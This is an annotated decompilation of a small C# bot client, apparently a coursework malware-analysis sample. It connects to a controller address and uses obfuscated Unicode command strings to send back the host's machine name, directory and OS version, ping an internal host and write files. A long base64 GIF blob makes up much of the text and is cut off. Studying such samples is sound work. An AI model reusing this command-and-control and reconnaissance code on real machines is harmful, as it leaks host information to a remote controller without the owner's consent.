// Decompiled with JetBrains decompiler
// Type: ns0.Class1
// Assembly: bot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B05469C7-C319-41CF-853E-3338A96927EC
// Assembly location: C:\Users\blang\Documents\BillsCoursework\cw_2024_2025\b-cleaned.exe

using System;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;

#nullable disable
namespace ns0
{
  internal class BotCommandActioner
  {
    private TcpClient current_tcp_connection;
    private StreamReader streamReader_0;
    private StreamWriter streamWriter_0;
    private bool potential_tcp_connection_open;
    private string[] random_unicode_array = new string[18]
    {
      "䁁ᘴ尵䌭帡Ἧ䭾䄴", // UTF-8 E4 81 81 E1 98 B4 E5 B0 B5 E4 8C AD E5 B8 A1 E1 BC AF E4 AD BE E4 84 B4
      "⽆⽞打㡁힠삾订헭춱", // UTF-8 E2 BD 86 E2 BD 9E E6 89 93 E3 A1 81 ED 9E A0 EC 82 BE E8 AE A2 ED 97 AD EC B6 B1
      "�籹\uEB56", // UTF-8 EF BF BD E7 B1 B9 (EE AD 96)
      "\u0E67٫Ṱ䑯\u0A7C", // UTF-8 (E0 B9 A7) E1 B9 B0 E4 91 AF (E0 A9 BC)
      "믑맔뿛귓\uE693\uE593\uE18Fꢝﺇ\uED9Aﻅ", // UTF-8 EB AF 91 EB A7 94 EB BF 9B EA B7 93 (EE 9A 93) (EE 96 93) EF BA 97 (EE B6 9A)
      "ꮚ拘뵔ꭈ�ኑ瘅✛獜礌搞",
      "鎭쟻\uF595\uE892\uF590뗍",
      "㍄≊㭒",
      "意ⅈ❖╇⭜㥝樗椗ᕺ",
      "\uF199\uF796\uF58F\uEB83벏믁믖",
      "缟紒挓愌眕⁜",
      "\uF7FF怖蔀麓ēᆡ벟鴦뮿臽",
      "尯䤦४ོണ㍑\u215E爎",
      "屰ɧᅥ\u0A7F䕫ἠ\u0B77᩻Ṵ",
      "\uEED9듌ꏆ듁\uF7C2ꦝ맏뒞䱫填呟",
      "ᅱえ浝㴐",
      "산삪풽삠풼誫삢ힿ쪰",
      "놙鎶蟡"
    };
    private bool tcp_connection_closed_due_to_controller = false;
    private bool bool_2 = true;
    private static readonly Random random_0 = new Random();
    private static readonly object object_0 = new object();

    public BotCommandActioner(string ip_address, int port_number)
    {
      this.bool_2 = false;
      try
      {
        // Create new tcp client object
        this.current_tcp_connection = new TcpClient();
        // Connect to it to open a tcp stream
        this.current_tcp_connection.Connect(ip_address, port_number);

        if (this.bool_2)
          Console.Write("軫諨鋦髲諦탸蛡鷰蓼�膴迺雫迮\uF39C");

        this.main_actioner();
      }
      catch (Exception ex)
      {
        if (!this.bool_2) // If bool_2 is false
          return;

        Console.WriteLine(ex.Message);
      }
    }

    public void main_actioner()
    {
      try
      {
        if (this.tcp_connection_closed_due_to_controller) // If tcp_connection_closed_due_to_controller is true then exit
          return;

        // Create an integer array the same length as random_unicode_array
        int[] int_array_same_length_as_unicode_array = new int[this.random_unicode_array.Length];

        for (int index = 0; index < this.random_unicode_array.Length; ++index)
          int_array_same_length_as_unicode_array[index] = index;

        // Randomly shuffling our earlier int array into a new variable
        int[] randomly_shuffled_int_array = this.randomly_shuffle_int_array(int_array_same_length_as_unicode_array);

        // Setting our read timeout
        this.current_tcp_connection.ReceiveTimeout = 5000;
        // Setting up our stream reader
        this.streamReader_0 = new StreamReader((Stream) this.current_tcp_connection.GetStream(), Encoding.ASCII);
        // Setting up our stream writer
        this.streamWriter_0 = new StreamWriter((Stream) this.current_tcp_connection.GetStream(), Encoding.ASCII);
        this.potential_tcp_connection_open = true;

        while (this.potential_tcp_connection_open)
        {
        // For 0 to the length of our random unicode array
          for (int index1 = 0; index1 < this.random_unicode_array.Length; ++index1)
          {
            Console.Write("[+]");
            // We pick a very random element from the random_unicode_array
            string random_unicode_element = this.random_unicode_array[randomly_shuffled_int_array[index1]];
            if ((this.tcp_connection_closed_due_to_controller ? 0 : (!(random_unicode_element.ToLower() == this.random_unicode_array[0]) ? 1 : 0)) != 0)
            {

              // If the random element = "⽆⽞打㡁힠삾订헭춱"
              if (random_unicode_element.ToLower() == this.random_unicode_array[1])
              {
                int length = BotCommandActioner.random_int_gen(5000, 4000000);
                double[] numArray2 = new double[length];
                for (int index2 = 0; index2 < length; ++index2)
                  numArray2[index2] = (double) index2;
                this.write_gif_to_file();
                random_unicode_element = random_unicode_element + " " + (object) Convert.ToInt32(length);
              }

              // If the random element = "�籹\uEB56"
              else if (random_unicode_element.ToLower() == this.random_unicode_array[2])
              {
                string[] salted_base64_array = new string[5]
                {
                  "U2FsdGVkX18kH6hnY7hTQVZBZrKhsdMuUmr5XsU/ddY=",
                  "U2FsdGVkX18kH6hnY7hTQfL4slGlLHuQiblYSjBLEpXH1r4e1NzjFxD5/k38tEn+",
                  "U2FsdGVkX18kH6hnY7hTQZ4KuiZvUrYv5m5qmfw1hzd1yHU/vXnuWPNYYyBdKM7b",
                  "U2FsdGVkX18kH6hnY7hTQRqi9u4sAz6rSphOpdmvlcOb47U7Hxs=",
                  "U2FsdGVkX18kH6hnY7hTQbuZ5iPlHmUr6jKEoquGISw="
                };
                int index3 = BotCommandActioner.random_int_gen(0, salted_base64_array.Length);
                random_unicode_element = random_unicode_element + " " + salted_base64_array[index3];
              }

              // If the random element = "\u0E67٫Ṱ䑯\u0A7C"
              else if (random_unicode_element.ToLower() == this.random_unicode_array[3])
              {
                BotCommandActioner class1 = new BotCommandActioner("10.10.10.17", 53);
              }

              // If the random element = "믑맔뿛귓\uE693\uE593\uE18Fꢝﺇ\uED9Aﻅ"
              else if (random_unicode_element.ToLower() == this.random_unicode_array[4])
              {
                string str2 = Environment.MachineName + " - " + Environment.CurrentDirectory + " - " + (object) Environment.OSVersion + " - ";
                random_unicode_element += str2;
              }

              // If the random element = "ꮚ拘뵔ꭈ�ኑ瘅✛獜礌搞"
              else if (random_unicode_element.ToLower() == this.random_unicode_array[5])
                new Ping().Send("10.1.1.100", 1000);

              // If the random element starts with "鎭쟻\uF595\uE892\uF590뗍"
              else if (random_unicode_element.ToLower().StartsWith(this.random_unicode_array[6]))
                this.write_string_to_file("myfile.txt", random_unicode_element);

              // If the random element starts with "㍄≊㭒"
              else if (random_unicode_element.ToLower().StartsWith(this.random_unicode_array[7]))
              {
                if (this.bool_2)
                  Console.WriteLine("[*]sleep");
                Console.Write("+]");
                this.tcp_connection_closed_due_to_controller = true;
                this.current_tcp_connection.Close();
                this.potential_tcp_connection_open = false;
                return;
              }

              // We send the controller our random_unicode_element after potentially running an action on the bot
              // If the controller then says "bye" back then we close the connection
              this.send_command_over_tcp(this.streamWriter_0, random_unicode_element);
              if (!this.streamReader_0.ReadLine().StartsWith("bye"))
              {
                Console.Write("~");
              }
              else
              {
                this.tcp_connection_closed_due_to_controller = true;
                this.current_tcp_connection.Close();
                return;
              }
            }
            else
            {
              this.potential_tcp_connection_open = false;
              this.tcp_connection_closed_due_to_controller = true;
              this.current_tcp_connection.Close();
              return;
            }
          }
        }
      }
      catch (Exception ex)
      {
        if (!this.bool_2)
          return;
        Console.WriteLine(ex.Message);
      }
    }

    // This reads an incoming message stream through our tcp connection
    public string read_incoming_string_from_tcp(StreamReader streamReader_1)
    {
      string taken_string = "";
      try
      {
        taken_string = streamReader_1.ReadLine();
        while (streamReader_1.Peek() >= 0)
          // Command may be multiple lines so we append onto the string from the steam
          taken_string += streamReader_1.ReadLine();
        if (this.bool_2) // If bool_2 is true then we have the whole message
          Console.WriteLine("... Received " + this.get_substring(taken_string, 30));
      }
      catch (Exception ex)
      {
        if (this.bool_2) // If bool_2 is true then we assume we have timed out
          Console.WriteLine("Receiver timeed out " + ex.Message);
      }
      return taken_string;
    }

    // Returns a substring of input_string based on the integer param length_to_extract
    public string get_substring(string input_string, int length_to_extract)
    {
      return string.IsNullOrEmpty(input_string) ? input_string : input_string.Substring(0, Math.Min(input_string.Length, length_to_extract));
    }


    public void send_command_over_tcp(StreamWriter streamWriter_1, string command_to_send)
    {
      if (this.bool_2)
        Console.WriteLine("[*]Bot Cmd: " + command_to_send);
      this.sleep_for_random_time(1, 5);
      streamWriter_1.WriteLine(command_to_send);
      streamWriter_1.Flush();
      Console.Write(".");
      if (!this.bool_2)
        return;
      Console.WriteLine("Sending " + command_to_send);
    }

    // Creates a temporary file
    // Doesn't do anything - wasn't coded properly?
    // Should probably take string_1 as the filename
    private static string create_temp_file(string string_1)
    {
      string fileName = string.Empty;
      try
      {
        fileName = Path.GetTempFileName();
        new FileInfo(fileName).Attributes = FileAttributes.Temporary;
      }
      catch (Exception ex)
      {
      }
      return fileName;
    }

    // Generates a random integer between the parameter bounds
    public static int random_int_gen(int lower_bound, int upper_bound)
    {
      lock (BotCommandActioner.object_0)
        return BotCommandActioner.random_0.Next(lower_bound, upper_bound);
    }

    // This takes an int array as a parameter and randomly shuffles it, then returns it
    private int[] randomly_shuffle_int_array(int[] int_array_param)
    {
      // Creating our randomness
      Random random = new Random(DateTime.Now.Millisecond);
      // Loop through the entire int array
      for (int length = int_array_param.Length; length > 0; --length)
      {
        // Generates random integer between 0 and the length of the int array
        int random_int = random.Next(length);
        // Selects a random integer from the array based on the index defined above
        int num = int_array_param[random_int];
        // Replaces the element at index of random_int with the one at -1 from it
        int_array_param[random_int] = int_array_param[length - 1];
        // Replaces the last element of the array with the one we set up in num
        int_array_param[length - 1] = num;
      }
      return int_array_param;
    }

    private string get_local_ip()
    {
      // For each ip in the ip address object of the local device
      foreach (IPAddress address in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
      {
        // If it is an ipv4 address
        if (address.AddressFamily.ToString() == "InterNetwork")
          return address.ToString(); // We return the ip if the addressfamily is internetwork
      }
      return "-"; // If no ip found then return -
    }

    // Pings a specific ip address, returns true if it gets a reply, false if not
    public bool ping_an_ip(string ip_to_ping, int number_of_ping_attempts, int ping_timeout)
    {
      Ping ping = new Ping();
      bool flag;
      for (int index = 0; index < number_of_ping_attempts; ++index)
      {
        try
        {
          PingReply pingReply = ping.Send(ip_to_ping, ping_timeout);
          if ((pingReply == null ? 1 : (pingReply.Status != IPStatus.Success ? 1 : 0)) == 0)
          {
            flag = true;
            goto label_7;
          }
        }
        catch
        {
        }
      }
      flag = false;
label_7:
      return flag;
    }

    // Writes the base64 encoded gif string to a file 'out.dat'
    public void write_gif_to_file()
    {
      string base64_enc_gif = "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